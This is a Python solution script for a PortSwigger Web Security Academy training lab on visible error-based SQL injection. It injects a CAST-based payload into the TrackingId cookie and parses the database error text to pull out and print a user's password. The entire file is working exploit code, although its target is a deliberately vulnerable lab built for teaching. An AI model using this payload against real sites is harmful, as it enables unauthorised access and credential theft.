#https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
from utils import *
import re

url="https://0a46001304693089819367d800380086.web-security-academy.net/filter?category=Lifestyle"
session=requests.Session()
response=session.get(url)
cookies=response.cookies
tracking_id=cookies['TrackingId']

payload="' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

tracking_id=''
forged_cookies=cookies
forged_cookies['TrackingId']=f"{tracking_id}{payload}"

response=session.get(url,cookies=forged_cookies)
soup=parse_html(response)
pattern = r'"([^"]+)"'
password_tag=soup.find('p',class_='is-warning').text
password=re.search(pattern,password_tag).group(1)
print(password)

#just need to login now to complete the lab